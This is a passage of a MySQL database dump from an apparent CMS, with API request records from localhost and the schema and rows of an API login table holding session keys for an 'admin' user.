INSERT INTO `jc_api_record` VALUES (1177, 1, '127.0.0.1', NULL, '2019-01-25 14:52:08', 1548399128199, '00E82B3D5F5E911BD72181D1FE6DED96');
INSERT INTO `jc_api_record` VALUES (1178, 1, '127.0.0.1', NULL, '2019-01-25 15:21:09', 1548400869590, 'A7B39A0F04E2613C32304A7C5455D31C');
INSERT INTO `jc_api_record` VALUES (1179, 1, '127.0.0.1', NULL, '2019-01-25 15:30:45', 1548401445232, '1678FBFB63EE6F6FB7984D9B02A16EC5');
INSERT INTO `jc_api_record` VALUES (1180, 1, '127.0.0.1', NULL, '2019-01-25 15:36:43', 1548401803780, '82F2845F5D368E66EEB72C357A61C7C6');
INSERT INTO `jc_api_record` VALUES (1181, 1, '127.0.0.1', NULL, '2019-01-25 15:37:49', 1548401869839, 'BA4DC6F39BA065E65DD7DF0988631651');
INSERT INTO `jc_api_record` VALUES (1182, 1, '127.0.0.1', NULL, '2019-01-25 15:40:24', 1548402024524, '4FB514EF729F90A68360846D61010C17');
INSERT INTO `jc_api_record` VALUES (1183, 1, '127.0.0.1', NULL, '2019-01-25 15:45:38', 1548402338435, 'BE2FA75221F4F260DCE3CD7CFF90CFAC');
INSERT INTO `jc_api_record` VALUES (1184, 1, '127.0.0.1', NULL, '2019-01-25 15:48:18', 1548402498295, '5C974CAAD87ED813A808177AF3EDC3A4');
INSERT INTO `jc_api_record` VALUES (1185, 1, '127.0.0.1', NULL, '2019-01-25 15:49:55', 1548402595570, '805E1004A20631691FC10A4E765967FE');
INSERT INTO `jc_api_record` VALUES (1186, 1, '127.0.0.1', NULL, '2019-01-25 15:50:58', 1548402658715, 'DA835CD7B0EAFE26A1F2CC700526F2EC');
INSERT INTO `jc_api_record` VALUES (1187, 1, '127.0.0.1', NULL, '2019-01-25 16:02:34', 1548403354311, '9B60A4C89669465EC72B88F64793BC3D');
INSERT INTO `jc_api_record` VALUES (1188, 1, '127.0.0.1', NULL, '2019-01-25 16:03:57', 1548403437165, '67DB46D7E2CA82C87A0E3C758D855F03');
INSERT INTO `jc_api_record` VALUES (1189, 1, '127.0.0.1', NULL, '2019-01-25 16:07:01', 1548403621684, '7AD7A164D4A4944BAF55B239D429C5D0');
INSERT INTO `jc_api_record` VALUES (1190, 1, '127.0.0.1', NULL, '2019-01-25 16:11:05', 1548403865821, '905D34C5DD92CC76F9E4AB87FB2DEE59');
INSERT INTO `jc_api_record` VALUES (1191, 1, '127.0.0.1', NULL, '2019-01-25 16:12:59', 1548403979786, '9570EB92E7541183D509B35BA9694425');
INSERT INTO `jc_api_record` VALUES (1192, 1, '127.0.0.1', NULL, '2019-01-25 16:13:13', 1548403993552, 'F7B9EBA1909DCBCCA68891B936FFC2A3');
INSERT INTO `jc_api_record` VALUES (1193, 1, '127.0.0.1', NULL, '2019-01-25 17:14:46', 1548407686441, '5AE6E673A147C5E61893DF48D39A455A');
INSERT INTO `jc_api_record` VALUES (1194, 1, '127.0.0.1', NULL, '2019-01-25 17:17:13', 1548407833395, 'D152F308557AE4D9415858122D1E1A40');
INSERT INTO `jc_api_record` VALUES (1195, 1, '127.0.0.1', NULL, '2019-01-25 17:19:32', 1548407972994, 'B811035FC96BC478D9AA69181D1D8571');
INSERT INTO `jc_api_record` VALUES (1196, 1, '127.0.0.1', NULL, '2019-01-25 17:22:53', 1548408173029, 'A25B3D7F2234E9A51724F96515DEBDCD');
INSERT INTO `jc_api_record` VALUES (1197, 1, '127.0.0.1', NULL, '2019-01-25 17:23:34', 1548408214138, '146DE08DA5602BD325B92240B3372B8C');
INSERT INTO `jc_api_record` VALUES (1198, 1, '127.0.0.1', NULL, '2019-01-25 17:29:50', 1548408590433, 'ED9F15531D8657A2D5DD84B25D3CA16B');
INSERT INTO `jc_api_record` VALUES (1199, 1, '127.0.0.1', NULL, '2019-01-25 17:30:16', 1548408616293, '2AED27A0B870EFBF387B04FABDE8D19B');
INSERT INTO `jc_api_record` VALUES (1200, 1, '127.0.0.1', NULL, '2019-01-25 17:31:30', 1548408690805, 'AD62262C9BA647A2A8D1CE74067E4FE7');
INSERT INTO `jc_api_record` VALUES (1201, 1, '127.0.0.1', NULL, '2019-01-28 09:54:23', 1548640463880, 'AF2911148B89318D11CF5339A3003B63');
INSERT INTO `jc_api_record` VALUES (1202, 1, '127.0.0.1', NULL, '2019-01-28 09:55:52', 1548640552767, '48B81DA584C3BAE5B25AC589D1B3053F');
INSERT INTO `jc_api_record` VALUES (1203, 1, '127.0.0.1', NULL, '2019-01-28 09:56:05', 1548640565356, '2F15B9965296FA25D18AA6A332354C18');
INSERT INTO `jc_api_record` VALUES (1204, 1, '127.0.0.1', NULL, '2019-01-28 09:57:11', 1548640631676, 'E28BA4630157977E41EC78B59039440A');
INSERT INTO `jc_api_record` VALUES (1205, 1, '127.0.0.1', NULL, '2019-01-28 09:57:52', 1548640672294, '4059137418E037C83772469561BA6839');
INSERT INTO `jc_api_record` VALUES (1206, 1, '127.0.0.1', NULL, '2019-01-28 10:02:05', 1548640925543, '241616E513CBE0CDB60D0E3A00375AE4');
INSERT INTO `jc_api_record` VALUES (1207, 1, '127.0.0.1', NULL, '2019-01-28 10:16:59', 1548641819160, 'D041BA690E02EE70CF9A209908C1A107');
INSERT INTO `jc_api_record` VALUES (1208, 1, '127.0.0.1', NULL, '2019-01-28 10:17:10', 1548641830093, 'CD3FBD114DF761C31C1679B5B044B50B');
INSERT INTO `jc_api_record` VALUES (1209, 1, '127.0.0.1', NULL, '2019-01-28 10:17:16', 1548641836967, 'D04B22B5064179CBFF8CA7B632B2DEFF');
INSERT INTO `jc_api_record` VALUES (1210, 1, '127.0.0.1', NULL, '2019-01-28 10:18:05', 1548641885441, '2470A6D30030B1904F322DC917B8ACF6');
INSERT INTO `jc_api_record` VALUES (1211, 1, '127.0.0.1', NULL, '2019-01-28 10:18:20', 1548641900961, '586E30C9BEAF2614206FF91953118AE0');
INSERT INTO `jc_api_record` VALUES (1212, 1, '127.0.0.1', NULL, '2019-01-28 10:20:42', 1548642042239, '562F401B4FCFD7D227A4E45044BEC4F1');
INSERT INTO `jc_api_record` VALUES (1213, 1, '127.0.0.1', NULL, '2019-01-28 10:20:43', 1548642043829, '4EB96531C8451BB6D07BC2AB1634718D');
INSERT INTO `jc_api_record` VALUES (1214, 1, '127.0.0.1', NULL, '2019-01-28 10:20:45', 1548642045052, '62A1CE0296DABC1555D5F9600C4D054C');
INSERT INTO `jc_api_record` VALUES (1215, 1, '127.0.0.1', NULL, '2019-01-28 10:20:53', 1548642053305, '45ADB21B8E72FB96F0F8D522E5127291');
INSERT INTO `jc_api_record` VALUES (1216, 1, '127.0.0.1', NULL, '2019-01-28 10:20:55', 1548642055229, '67AE646AF6DCB603908C1B4D081EFA75');
INSERT INTO `jc_api_record` VALUES (1217, 1, '127.0.0.1', NULL, '2019-01-28 10:21:33', 1548642093627, '61C62E193034D9269A0F887A3B47263C');
INSERT INTO `jc_api_record` VALUES (1218, 1, '127.0.0.1', NULL, '2019-01-28 10:22:37', 1548642157674, '3FEA78D603130BC2C8E9622FF6258AED');
INSERT INTO `jc_api_record` VALUES (1219, 1, '127.0.0.1', NULL, '2019-01-28 14:36:50', 1548657410571, '64B48D8D530FBBEE1CCCD50642D16D8D');
INSERT INTO `jc_api_record` VALUES (1220, 1, '127.0.0.1', NULL, '2019-01-28 14:37:07', 1548657427990, 'E637538119009C6B176B00773E7A61D3');
INSERT INTO `jc_api_record` VALUES (1221, 1, '127.0.0.1', NULL, '2019-01-28 14:37:18', 1548657438097, '829520062E22B127E05DD17C4DB10DC3');
INSERT INTO `jc_api_record` VALUES (1222, 1, '127.0.0.1', NULL, '2019-01-28 14:37:38', 1548657458851, 'FDE7135BFE3FF9AA9859BA4D3AFFF81D');
INSERT INTO `jc_api_record` VALUES (1223, 1, '127.0.0.1', NULL, '2019-01-28 14:37:52', 1548657472927, '192C83DD4E7542B19A65EEF348D7E485');
INSERT INTO `jc_api_record` VALUES (1224, 1, '127.0.0.1', NULL, '2019-01-28 14:40:36', 1548657636476, '23B911B954A08132FF17DBA0E7779C9C');
INSERT INTO `jc_api_record` VALUES (1225, 1, '127.0.0.1', NULL, '2019-01-28 14:40:50', 1548657650457, '96E57001E610AD273D38444B2E128766');
INSERT INTO `jc_api_record` VALUES (1226, 1, '127.0.0.1', NULL, '2019-01-28 14:42:13', 1548657733351, '1B73AED53B8387C7BE0FEBF16A305549');
INSERT INTO `jc_api_record` VALUES (1227, 1, '127.0.0.1', NULL, '2019-01-28 14:42:50', 1548657770153, '43DC8DC53F7204CA974C40FEAD833EBC');
INSERT INTO `jc_api_record` VALUES (1228, 1, '127.0.0.1', NULL, '2019-01-28 14:47:40', 1548658060500, '47F9210B4A30B2F7BB011043232022B2');
INSERT INTO `jc_api_record` VALUES (1229, 1, '127.0.0.1', NULL, '2019-01-28 14:49:27', 1548658167032, '6E4BB87855BA93DDE3D9C98E3B748421');
INSERT INTO `jc_api_record` VALUES (1230, 1, '127.0.0.1', NULL, '2019-01-28 16:28:58', 1548664138035, 'DF13E0FDE4CC20A1E6F1DAEB5D02341F');
INSERT INTO `jc_api_record` VALUES (1231, 1, '127.0.0.1', NULL, '2019-01-28 16:29:15', 1548664155525, 'B8F37901A68DAEF8F1EF6D23C59BC7AC');
INSERT INTO `jc_api_record` VALUES (1232, 1, '127.0.0.1', NULL, '2019-01-28 16:29:28', 1548664168859, '06D011A332AC39DC778F73C7B330221F');
INSERT INTO `jc_api_record` VALUES (1233, 1, '127.0.0.1', NULL, '2019-01-28 16:29:35', 1548664175453, '125C5AE43201F3E1223CADF306DAD26A');
INSERT INTO `jc_api_record` VALUES (1234, 1, '127.0.0.1', NULL, '2019-01-28 16:31:00', 1548664260175, '513A06F0F1DD3763DA1205B4B5532454');
INSERT INTO `jc_api_record` VALUES (1235, 1, '127.0.0.1', NULL, '2019-01-28 16:31:12', 1548664272787, '77E22AF7412D69C3DF2F2575F9423A4C');
INSERT INTO `jc_api_record` VALUES (1236, 1, '127.0.0.1', NULL, '2019-01-28 16:31:51', 1548664311094, '287BCF873DABB69828976AE2C751F254');
INSERT INTO `jc_api_record` VALUES (1237, 1, '127.0.0.1', NULL, '2019-01-28 16:32:00', 1548664320689, 'D253B759ADA897806C1E89B2F87AE782');
INSERT INTO `jc_api_record` VALUES (1238, 1, '127.0.0.1', NULL, '2019-01-28 16:33:06', 1548664386846, '4F78B389226058EA22251A0D4AF1684F');
INSERT INTO `jc_api_record` VALUES (1239, 1, '127.0.0.1', NULL, '2019-01-28 16:33:25', 1548664405082, 'F66591D3A1D40244B0645159D3F4CDA2');
INSERT INTO `jc_api_record` VALUES (1240, 1, '127.0.0.1', NULL, '2019-01-28 16:33:33', 1548664413311, 'B0D88E41647F1D56997724CC80E9E022');
INSERT INTO `jc_api_record` VALUES (1241, 1, '127.0.0.1', NULL, '2019-01-28 16:39:56', 1548664796588, 'D41916ECA41384D8D485C7DFFA697482');
INSERT INTO `jc_api_record` VALUES (1242, 1, '127.0.0.1', NULL, '2019-01-28 16:42:00', 1548664920482, 'D1C86F16AD41922BD742F6E44135CC53');
INSERT INTO `jc_api_record` VALUES (1243, 1, '127.0.0.1', NULL, '2019-01-28 16:42:02', 1548664922324, 'C23500B970F317C472F9EA07AD37475C');
INSERT INTO `jc_api_record` VALUES (1244, 1, '127.0.0.1', NULL, '2019-01-28 16:44:08', 1548665048211, '506C20B26971B6C383B66285DBD6E836');
INSERT INTO `jc_api_record` VALUES (1245, 1, '127.0.0.1', NULL, '2019-01-28 16:45:21', 1548665121491, '25578A1A68D68EC3E6D43D0AB73E27D3');
INSERT INTO `jc_api_record` VALUES (1246, 1, '127.0.0.1', NULL, '2019-01-28 16:45:41', 1548665141701, 'B60DAADEA84AF78050312AF4BB4AD800');
INSERT INTO `jc_api_record` VALUES (1247, 1, '127.0.0.1', NULL, '2019-01-28 16:46:00', 1548665160048, '3017FB763F1E71C5D4ECC2C121ED9E4A');
INSERT INTO `jc_api_record` VALUES (1248, 1, '127.0.0.1', NULL, '2019-01-28 16:46:54', 1548665214769, 'E4B268E6774013701FA5CC67DAB22624');
INSERT INTO `jc_api_record` VALUES (1249, 1, '127.0.0.1', NULL, '2019-01-28 16:48:24', 1548665304208, '445C0D9F9206A40174E7C435712AEAE6');
INSERT INTO `jc_api_record` VALUES (1250, 1, '127.0.0.1', NULL, '2019-01-28 16:50:32', 1548665432401, 'C630AA56E9DD48A783E838CB7E76C1E6');
INSERT INTO `jc_api_record` VALUES (1251, 1, '127.0.0.1', NULL, '2019-01-28 16:51:53', 1548665513957, '66F7449ACD5850478976662B1A22C07B');
INSERT INTO `jc_api_record` VALUES (1252, 1, '127.0.0.1', NULL, '2019-01-28 16:52:02', 1548665522750, 'C683CAF168F6AF41DFC29A3E047BCC80');
INSERT INTO `jc_api_record` VALUES (1253, 1, '127.0.0.1', NULL, '2019-01-28 16:52:15', 1548665535058, 'BE2BF90A93DADBB81685419D8DF384E8');
INSERT INTO `jc_api_record` VALUES (1254, 1, '127.0.0.1', NULL, '2019-01-28 16:56:25', 1548665785848, 'C95F72FAA72596DAB9344E9AC91DFEAE');
INSERT INTO `jc_api_record` VALUES (1255, 1, '127.0.0.1', NULL, '2019-01-28 16:56:34', 1548665794858, '0CA315D909C2B96F757A65CD5A069DE6');
INSERT INTO `jc_api_record` VALUES (1256, 1, '127.0.0.1', NULL, '2019-01-28 16:56:44', 1548665804980, 'E8B36DB5A3252B5D6B1EBBC34D7C933C');
INSERT INTO `jc_api_record` VALUES (1257, 1, '127.0.0.1', NULL, '2019-01-28 16:57:24', 1548665844989, '4009A197435A8C34FBBC7CBFDCA0A14F');
INSERT INTO `jc_api_record` VALUES (1258, 1, '127.0.0.1', NULL, '2019-01-28 16:57:47', 1548665867283, '565AD47D3A4A111D71385128BBE495AE');
INSERT INTO `jc_api_record` VALUES (1259, 1, '127.0.0.1', NULL, '2019-01-28 16:59:38', 1548665978500, '772BB041BA28B16AC0B8C48D48D160CE');
INSERT INTO `jc_api_record` VALUES (1260, 1, '127.0.0.1', NULL, '2019-01-29 10:16:34', 1548728194207, '7BCE24E52FDFA32B6CD5DC842C81BE19');

-- ----------------------------
-- Table structure for jc_api_user_login
-- ----------------------------
DROP TABLE IF EXISTS `jc_api_user_login`;
CREATE TABLE `jc_api_user_login`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `session_key` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT 'sesssionKey',
  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户名',
  `login_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' ON UPDATE CURRENT_TIMESTAMP COMMENT '登陆时间',
  `login_count` int(11) NOT NULL DEFAULT 0 COMMENT '登陆次数',
  `active_time` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00' COMMENT '最后活跃时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 562 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'API用户登录表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_api_user_login
-- ----------------------------
INSERT INTO `jc_api_user_login` VALUES (4, 'EFF9F6ADE387F76F04638010D93E2AFC', 'admin', '2017-12-26 18:44:45', 1, '2017-12-26 18:46:10');
INSERT INTO `jc_api_user_login` VALUES (5, '434BFB90D8D1A16407163E36D6621182', 'admin', '2018-11-22 14:37:05', 1, '2018-11-22 15:07:59');
INSERT INTO `jc_api_user_login` VALUES (6, 'BB29C1AF7CD3D849B9AE40330C06D429', 'admin', '2018-11-22 15:08:31', 1, '2018-11-22 15:15:09');
INSERT INTO `jc_api_user_login` VALUES (7, '12C97D8EF14C4D17BA1FF087FC5A8332', 'admin', '2018-11-22 15:17:39', 1, '2018-11-22 15:21:53');
INSERT INTO `jc_api_user_login` VALUES (8, '6EE45CF3D0187D709E0AD5BF2279207C', 'admin', '2018-11-22 15:52:44', 1, '2018-11-22 15:52:44');
INSERT INTO `jc_api_user_login` VALUES (9, '6485B9CA9529C675B6EC7527A0943159', 'admin', '2018-11-22 15:58:01', 1, '2018-11-22 15:58:02');
INSERT INTO `jc_api_user_login` VALUES (10, '3A66CC3BC2317273E6F5227B5F5069CA', 'admin', '2018-11-22 15:59:11', 1, '2018-11-22 15:59:14');
INSERT INTO `jc_api_user_login` VALUES (11, '720E1E51A920382FBEC489A40A3CEFA8', 'admin', '2018-11-22 15:59:48', 1, '2018-11-22 15:59:49');
INSERT INTO `jc_api_user_login` VALUES (12, '4F31A5D3BB152DF1CCC2D5D931CA9B73', 'admin', '2018-11-22 16:00:12', 1, '2018-11-22 16:00:13');
INSERT INTO `jc_api_user_login` VALUES (13, '7DF6F94A80CFED6929EB5A30DD36F122', 'admin', '2018-11-22 16:01:00', 1, '2018-11-22 16:03:24');
INSERT INTO `jc_api_user_login` VALUES (14, 'DA58930E19E0282C92554EAD11E9EAB0', 'admin', '2018-11-22 16:05:03', 1, '2018-11-22 16:13:20');
INSERT INTO `jc_api_user_login` VALUES (15, 'FA1DD14F0F945DFA9BA085AB16BFFD8D', 'admin', '2018-11-22 16:13:39', 1, '2018-11-22 16:24:14');
INSERT INTO `jc_api_user_login` VALUES (16, 'D1A5D79ED8A36601FD056FA1935130C2', 'admin', '2018-11-22 16:38:41', 1, '2018-11-22 16:38:42');
INSERT INTO `jc_api_user_login` VALUES (17, '9130610A06A86819AD8F80B3768617CD', 'admin', '2018-11-22 16:40:25', 1, '2018-11-22 16:40:25');
INSERT INTO `jc_api_user_login` VALUES (18, '8C0E633090AE76438FB1871AB2299BE7', 'admin', '2018-11-22 16:42:46', 1, '2018-11-22 16:42:46');
INSERT INTO `jc_api_user_login` VALUES (19, '823798D31339573119C09DF8DA78C667', 'admin', '2018-11-22 16:43:12', 1, '2018-11-22 16:43:13');
INSERT INTO `jc_api_user_login` VALUES (20, '3FD3150DDFF97C189F77584BE28E5985', 'admin', '2018-11-22 16:44:53', 1, '2018-11-22 16:44:53');
INSERT INTO `jc_api_user_login` VALUES (21, '2DF31319C404038C7FA3E7D575D3D00B', 'admin', '2018-11-22 16:49:02', 1, '2018-11-22 17:21:16');
INSERT INTO `jc_api_user_login` VALUES (22, '97527E6E9DE2B4F5FE6C6E26AE270596', 'admin', '2018-11-22 17:25:57', 1, '2018-11-22 17:35:03');
INSERT INTO `jc_api_user_login` VALUES (23, 'F2417C55F47F0557CC351AB497D05AE3', 'admin', '2018-11-23 09:14:18', 1, '2018-11-23 09:17:41');
INSERT INTO `jc_api_user_login` VALUES (24, '4D12709A150D9B7EFB776589C9F3E6AA', 'admin', '2018-11-23 09:51:16', 1, '2018-11-23 10:20:53');
INSERT INTO `jc_api_user_login` VALUES (25, '2C92488908444EF5504D5EBCCC4618BA', 'admin', '2018-11-23 11:06:03', 1, '2018-11-23 11:23:19');
INSERT INTO `jc_api_user_login` VALUES (26, 'D15ABCB404C74CCBE0849C82DC1FCE55', 'admin', '2018-11-26 09:52:02', 1, '2018-11-26 09:52:03');
INSERT INTO `jc_api_user_login` VALUES (27, 'F6719AC89162F959DC986CA82F19C6DC', 'admin', '2018-11-26 17:04:26', 1, '2018-11-26 17:04:27');
INSERT INTO `jc_api_user_login` VALUES (28, '4ADB1DCF1C04DAACE7A541F689F4B5F9', 'admin', '2018-11-27 09:14:57', 1, '2018-11-27 09:14:58');
INSERT INTO `jc_api_user_login` VALUES (29, '287ED2E54BABECFF5AC0A6A927CAFEE9', 'admin', '2018-11-27 09:20:22', 1, '2018-11-27 09:20:23');
INSERT INTO `jc_api_user_login` VALUES (30, '0A569F42BABD2722ED19C792114767DD', 'admin', '2018-11-27 09:20:59', 1, '2018-11-27 09:21:00');
INSERT INTO `jc_api_user_login` VALUES (31, '0A3A1F596419841EBE57672A52987175', 'admin', '2018-11-27 09:33:25', 1, '2018-11-27 09:33:26');
INSERT INTO `jc_api_user_login` VALUES (32, '7C838F54A7DDE294C25741A9E8949525', 'admin', '2018-11-27 09:35:12', 1, '2018-11-27 09:35:12');
INSERT INTO `jc_api_user_login` VALUES (33, '76E89B6D955BA0DA45310E4F93B56049', 'admin', '2018-11-27 09:37:29', 1, '2018-11-27 09:56:32');
INSERT INTO `jc_api_user_login` VALUES (34, '8497D8209BB456F17F46D2EC29A294F3', 'admin', '2018-11-27 10:42:00', 1, '2018-11-27 10:42:02');
INSERT INTO `jc_api_user_login` VALUES (35, '1AEAAD50102074D0ACFE26A62B2C7D49', 'admin', '2018-11-27 11:14:17', 1, '2018-11-27 11:15:51');
INSERT INTO `jc_api_user_login` VALUES (36, '12F70A78CE4BA765BEB5C98F694F8FDB', 'admin', '2018-11-27 13:23:05', 1, '2018-11-27 13:25:46');
INSERT INTO `jc_api_user_login` VALUES (37, '869FDC9A8131403CA30A18E383A24843', 'admin', '2018-11-27 13:25:57', 1, '2018-11-27 13:33:05');
INSERT INTO `jc_api_user_login` VALUES (38, '983B59566843612278B6BC7D8BEDA3F5', 'admin', '2018-11-27 13:36:11', 1, '2018-11-27 13:36:12');
INSERT INTO `jc_api_user_login` VALUES (39, 'F19776C16946EAA8FC42C3A00CEF07AB', 'admin', '2018-11-27 13:37:41', 1, '2018-11-27 13:38:05');
INSERT INTO `jc_api_user_login` VALUES (40, '4884AD21E1A0FF972A3505635F9BC889', 'admin', '2018-11-27 13:38:36', 1, '2018-11-27 13:38:42');
INSERT INTO `jc_api_user_login` VALUES (41, '06A1D914B05463F6693E2B91A12F9BDF', 'admin', '2018-11-27 13:38:51', 1, '2018-11-27 13:38:51');
INSERT INTO `jc_api_user_login` VALUES (42, '9D8E7884E766480967A0E7A2927841C5', 'admin', '2018-11-27 13:40:13', 1, '2018-11-27 13:40:13');
INSERT INTO `jc_api_user_login` VALUES (43, 'CCBD3CFFCF2F1EBDA1E5AA8F16D1DA4B', 'admin', '2018-11-27 13:40:23', 1, '2018-11-27 13:40:23');
INSERT INTO `jc_api_user_login` VALUES (44, 'D9EC3A8EF90A892D4CE1934506BBE9C7', 'admin', '2018-11-27 13:41:17', 1, '2018-11-27 13:44:32');
INSERT INTO `jc_api_user_login` VALUES (45, '6E1E698DA9E4AE2454D3771BBB65F603', 'admin', '2018-11-27 13:45:48', 1, '2018-11-27 13:59:54');
INSERT INTO `jc_api_user_login` VALUES (46, 'DDE1A807660EA6EABFD2BC0156904223', 'admin', '2018-11-27 14:14:34', 1, '2018-11-27 14:40:55');
INSERT INTO `jc_api_user_login` VALUES (47, '8A29873D60D015416DE8730FB45E598E', 'admin', '2018-11-27 14:45:16', 1, '2018-11-27 15:00:51');
INSERT INTO `jc_api_user_login` VALUES (48, '92545B8FB66527B4B1BBEFDDA9997D53', 'admin', '2018-11-27 15:01:08', 1, '2018-11-27 15:01:52');
INSERT INTO `jc_api_user_login` VALUES (49, '5AA7429062DE79982A5DC3E10C5FCD36', 'admin', '2018-11-27 15:03:16', 1, '2018-11-27 15:04:13');
INSERT INTO `jc_api_user_login` VALUES (50, '9E1398CE37EE7FEB1DF7D2C74AF2F640', 'admin', '2018-11-27 15:04:46', 1, '2018-11-27 15:08:19');
INSERT INTO `jc_api_user_login` VALUES (51, '0A3B0A3E6DD4A5F428722E1375393CDD', 'admin', '2018-11-27 15:10:41', 1, '2018-11-27 16:15:54');
INSERT INTO `jc_api_user_login` VALUES (52, 'C84FE4C877EA7B13089231D05794E74D', 'admin', '2018-11-27 16:11:27', 1, '2018-11-27 16:24:47');
INSERT INTO `jc_api_user_login` VALUES (53, '047BB783C7EAFA45D2C47B4FB99BBB0E', 'admin', '2018-11-27 17:04:54', 1, '2018-11-27 17:14:58');
INSERT INTO `jc_api_user_login` VALUES (54, 'AF51B44303BAB1695663E487F1A3E1E2', 'admin', '2018-11-28 09:30:12', 1, '2018-11-28 09:30:18');
INSERT INTO `jc_api_user_login` VALUES (55, '351CCDD49CE2E527AFDBD0A15AFC0FC2', 'admin', '2018-11-28 09:31:02', 1, '2018-11-28 09:31:34');
INSERT INTO `jc_api_user_login` VALUES (56, '5DEB086DB2F6DA8C741A359D8E99637E', 'admin', '2018-11-28 09:32:33', 1, '2018-11-28 09:39:50');
INSERT INTO `jc_api_user_login` VALUES (57, '33F712F556AA522A75960D9D964185B7', 'admin', '2018-11-28 09:40:02', 1, '2018-11-28 09:40:03');
INSERT INTO `jc_api_user_login` VALUES (58, '645D73FDD3CB6B5239F2989526C94423', 'admin', '2018-11-28 09:40:52', 1, '2018-11-28 09:40:53');
INSERT INTO `jc_api_user_login` VALUES (59, '5AC25CC95A694CAF0982D6D6CBADAD48', 'admin', '2018-11-28 09:49:47', 1, '2018-11-28 09:51:33');
INSERT INTO `jc_api_user_login` VALUES (60, 'A002076AB3D88B9FE1A210C86F05B058', 'admin', '2018-11-28 09:57:39', 1, '2018-11-28 09:57:40');
INSERT INTO `jc_api_user_login` VALUES (61, '45A962C4E0F457C89936EFD9B4DF8816', 'admin', '2018-11-28 09:58:51', 1, '2018-11-28 09:58:52');
INSERT INTO `jc_api_user_login` VALUES (62, '5A79A809E77FF46433EC6DA7F7C8B8D2', 'admin', '2018-11-28 09:59:55', 1, '2018-11-28 09:59:55');
INSERT INTO `jc_api_user_login` VALUES (63, 'F12AA069A553B368DEB9764C93273FF2', 'admin', '2018-11-28 10:00:30', 1, '2018-11-28 10:08:18');
INSERT INTO `jc_api_user_login` VALUES (64, 'CFECA07B1E1C4B82B17A4D76FB1B43F7', 'admin', '2018-11-28 10:14:12', 1, '2018-11-28 10:14:12');
INSERT INTO `jc_api_user_login` VALUES (65, '05978A4F7FF4E9464A996F314ED86255', 'admin', '2018-11-28 10:14:16', 1, '2018-11-28 10:14:16');
INSERT INTO `jc_api_user_login` VALUES (66, '15C4765DD5317E75B1EBA31A6727DDA8', 'admin', '2018-11-28 10:14:18', 1, '2018-11-28 10:14:18');
INSERT INTO `jc_api_user_login` VALUES (67, '67D8FAEB33387FE5FB59FE6257B1C2DB', 'admin', '2018-11-28 10:14:26', 1, '2018-11-28 10:14:26');
INSERT INTO `jc_api_user_login` VALUES (68, '226C7EA884BDE55B7A8F0B47BCD47931', 'admin', '2018-11-28 10:16:20', 1, '2018-11-28 10:30:42');
INSERT INTO `jc_api_user_login` VALUES (69, '52CE781B8B66147E21D7B95721899B58', 'admin', '2018-11-28 10:32:29', 1, '2018-11-28 10:32:47');
INSERT INTO `jc_api_user_login` VALUES (70, 'B981B802DFE1E443E2E57E356D2C6CCC', 'admin', '2018-11-28 10:32:55', 1, '2018-11-28 10:33:00');
INSERT INTO `jc_api_user_login` VALUES (71, '6850B42D9AE71BEC2276E7084E718779', 'admin', '2018-11-28 10:34:00', 1, '2018-11-28 10:48:15');
INSERT INTO `jc_api_user_login` VALUES (72, 'F402E3424EE9DCBE84E745C7E90775D9', 'admin', '2018-11-28 10:58:14', 1, '2018-11-28 10:58:14');
INSERT INTO `jc_api_user_login` VALUES (73, '1F77438DCF8E54E2FB6DED5AD2C12A65', 'admin', '2018-11-28 11:03:05', 1, '2018-11-28 11:03:05');
INSERT INTO `jc_api_user_login` VALUES (74, 'AE62F24C4BA484E8F73E3D710DFD8E67', 'admin', '2018-11-28 11:03:54', 1, '2018-11-28 11:17:03');
INSERT INTO `jc_api_user_login` VALUES (75, 'E25198817F38449EDE6A59BB69B2C9F9', 'admin', '2018-11-28 11:31:10', 1, '2018-11-28 11:36:15');
INSERT INTO `jc_api_user_login` VALUES (76, 'A7DE1C752AC1519CF1E70973F754783B', 'admin', '2018-11-28 11:37:35', 1, '2018-11-28 11:37:39');
INSERT INTO `jc_api_user_login` VALUES (77, '30B4B1667848C37758CB124455713716', 'admin', '2018-11-28 12:05:27', 1, '2018-11-28 12:05:27');
INSERT INTO `jc_api_user_login` VALUES (78, '3294D16843BE301CAAD5BE167F905E5B', 'admin', '2018-11-29 09:44:32', 1, '2018-11-29 09:44:33');
INSERT INTO `jc_api_user_login` VALUES (79, '3B1959823ADB3EEE45225C8C68376CBE', 'admin', '2018-11-29 09:58:37', 1, '2018-11-29 10:02:47');
INSERT INTO `jc_api_user_login` VALUES (80, '40F530515BB83A44C32A4D396C54000C', 'admin', '2018-11-29 10:02:56', 1, '2018-11-29 10:02:56');
INSERT INTO `jc_api_user_login` VALUES (81, '9ECA4928D06EB4EB06623F7B5E2129C1', 'admin', '2018-11-29 10:03:45', 1, '2018-11-29 10:03:45');
INSERT INTO `jc_api_user_login` VALUES (82, 'D9DBC8E483A0D46E7955D5A7DB212FFB', 'admin', '2018-11-29 10:04:24', 1, '2018-11-29 10:17:28');
INSERT INTO `jc_api_user_login` VALUES (83, '0EC527619EBDD656AE558C54D2DE7F21', 'admin', '2018-11-29 10:53:27', 1, '2018-11-29 11:11:59');
INSERT INTO `jc_api_user_login` VALUES (84, '9FB0600E88A4B0D24A7AB5E556FBFBE0', 'admin', '2018-11-29 11:16:32', 1, '2018-11-29 11:27:44');
INSERT INTO `jc_api_user_login` VALUES (85, 'B2BADB283B874704B0EBBBCDE511752E', 'admin', '2018-11-29 11:27:52', 1, '2018-11-29 11:30:33');
INSERT INTO `jc_api_user_login` VALUES (86, 'A3A75F115B4E8D89EFE11F1285DA07A2', 'admin', '2018-11-29 11:34:36', 1, '2018-11-29 11:40:31');
INSERT INTO `jc_api_user_login` VALUES (87, '1FC455023A68A1F3CC2FEBF9FD530AD9', 'admin', '2018-11-29 14:22:17', 1, '2018-11-29 14:24:53');
INSERT INTO `jc_api_user_login` VALUES (88, '5794D9DE055DB70BD4792D238F1885BC', 'admin', '2018-11-29 14:25:26', 1, '2018-11-29 14:25:29');
